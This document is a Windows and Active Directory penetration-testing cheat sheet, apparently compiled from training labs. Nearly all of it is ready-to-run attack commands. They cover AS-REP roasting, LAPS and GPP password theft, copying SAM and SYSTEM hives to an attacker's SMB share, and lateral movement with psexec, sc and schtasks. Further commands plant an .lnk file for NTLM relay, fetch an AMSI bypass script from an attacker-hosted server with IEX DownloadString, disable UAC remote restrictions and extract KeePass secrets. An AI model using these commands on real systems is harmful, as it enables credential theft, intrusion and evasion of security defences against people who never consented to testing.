### Exploit Suggester Tools
```
1)Winpeas
2)Seabelt
3)Wattson
4)Sharpup
```

### Check for Passwords in GPO under SYSVOL or similar
```
impacket-Get-GPPPassword <FQDN> -s <share>
```

### Check for AS-REPRoast users
(users without Kerberos pre-auth required)
```
GetNPUsers.py contoso.com/ -usersfile usernames.txt -format hashcat

OR
netexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out
```

### Steal admin password from LAPS 
(if your account is part of LAPS reader or similar)
```
crackmapexec smb IP -u USER -d DOMAIN.COM -p CLEAR-TEXT -M laps
```

### Check Powershell history
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### How to dump Passwords from SAM 
```
    //Create  a share on your VM
    smbserver.py sharename . -smb2support -username user -password s3cureP@ssword

    //Connect share on victim vm
    net use \\10.50.63.2\share /USER:user s3cureP@ssword

    //Dump passwords to share
    reg.exe save HKLM\SAM sam.bak
    reg.exe save HKLM\SYSTEM system.bak
    reg.exe save HKLM\SECURITY security.bak

    //Move bak to SMB Share to your Kali
    net use \\<ip>\<share> /USER:<username> <password>
    move sam.bak \\<ip>\<share> 
    move system.bak \\<ip>\<share> 
    move security.bak \\<ip>\<share> 

    //Extract passwords on our Kali
    sudo python3 ~/Tools/impacket/examples/secretsdump.py -sam sam.bak -security security.bak -system system.bak LOCAL
```

### Run Reverse Shell with PSexec
```
    Ports: 445/TCP (SMB)
    Required Group Memberships: Administrators

psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### Run Reverse Shell with WinRM
```
    Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
    Required Group Memberships: Remote Management User
	
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

### Create a new user remotely with a new Windows Service
```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

### Run a task with taskmanager
```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
```

### Check for shares
```
netexec smb 10.129.25.101 -u 'guest' -p '' --shares
```

### Brute users 
```
netexec smb 10.129.25.101  -u '' -p '' --rid-brute
```

### Logged in users
```shell-session
netexec smb 10.129.203.121 -u robert -p Inlanefreight01! --loggedon-users
```

### Failed login bypass
If you get a error during login in samba(the password are correct)
```
PASSWORD_MUST_CHANGE
```
Then you can change the password.
```
smbpasswd -r 10.129.203.121 -U peter
```
And lastly login again!

### Get passwords from GPO
```
netexec smb 10.129.25.101 -u grace -p Inlanefreight01! -M gpp_password
```

### Get passwords from Autologin policy
```
netexec smb 10.129.25.101 -u grace -p Inlanefreight01! -M gpp_autologin
```

### How to filter out result for specific words in Netexec
```
netexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=secret
```
(This will filter out the result of the module with the keyword=secret).

### Run a SQL query in SQL Netexec
```
netexec mssql dc01.inlanefreight.htb -u engels -p Inlanefreight1998! -q "SELECT * from [core_app].[dbo].tbl_users"
```

### Getting XP_CMDSHELL in Netexec
```
//Getting SA
netexec mssql dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc

//Getting RCE
netexec mssql dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X 'whoami'

//Rollback
netexec mssql dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
```

### Spidering shares in Netexec
```shell-session
//List files & folders in a share
netxec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --regex .

//Searching for a specific name
netexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --content --regex Encrypt

//Search for a specific pattern ex *txt*
netexec smb dc01.inlanefreight.htb -u grace -p Inlanefreight01! --spider users --pattern txt

//Get the whole dirtree as json from allshares
netexec smb dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
```

### NTLM Relay in Netexec
You can perform a *ntlmrelay* aka "pass the ntlm hash" to pass the hashes and perform other attacks.
```shell-session
//Find a share with RW rights
netexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
SMB     172.16.1.10    445   DC01    IT-Tools    READ,WRITE

//Upload a malicious *.lnk* to the writable share so you can sniff the NTLM(SERVER=OUR_IP)
netexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.155 NAME=backup

//Get all the hosts with NTLM signing=OFF
netexec smb 172.16.1.0/24 --gen-relay-list relay.txt 

//Perform the relay to login to other machines
impacket-ntlmrelayx -tf relay.txt -smb2support --no-http
```

### Getting gMSA password via Netexec
```shell-session
//Getting the list of who can read gMSA 
netexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"

//Getting from gMSA with the allowed user
netexec ldap dc01.inlanefreight.htb -u engels -p Inlanefreight1998! --gmsa
```

### Getting all users with Passwd not required
```
netexec ldap dc01.inlanefreight.htb -u robert -p 'Inlanefreight01!' --password-not-required
```

### Patch AMSI via Netexec
```shell-session
netexec smb dc01.inlanefreight.htb -u robert -p 'Inlanefreight01!' -X '$PSVersionTable' --amsi-bypass amsibypass.txt
```
If you get an size limit error then nest the script together.
```shell-session
echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanukhande-amsi.ps1');" > amsibypass.txt
sudo python3 -m http.server 80

//Then serve the hosted script that calls back your original bypass that was too big.
```

### Disable UAC via Netexec
Only Admins can run remote commands with UAC bypass, in case use this one to remove it.
```shell-session
netexec smb 10.129.231.91 -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

### Connect to SSH via Netexec
```
netexec ssh 10.129.231.91 --key-file julio_keys -u julio -p '' -x "whoami"
```

### Ping Sweep via Netexec
```shell-session
netexec smb 10.129.203.121 -u julio -p Password1 -M get_netconnections

OR 
netexec smb 10.129.203.121 -u julio -p Password1 -M get-network -o ALL=true
```

### Discover Keepass config files via Netexec
```shell-session
netexec smb 10.129.204.177 -u julio -p Password1 -M keepass_discover

//Downloading the content from the injected session
netexec smb 10.129.204.177 -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/david/AppData/Roaming/KeePass/KeePass.config.xml
```
(Remember to use the slashes and not the backslashes in the config path as windows have other URI standards.)

### Getting all users with Kerberos auth enabled
```shell-session
netexec smb 10.129.203.121 -u account_not_exist julio robert -p OtherPassword --kerberos
```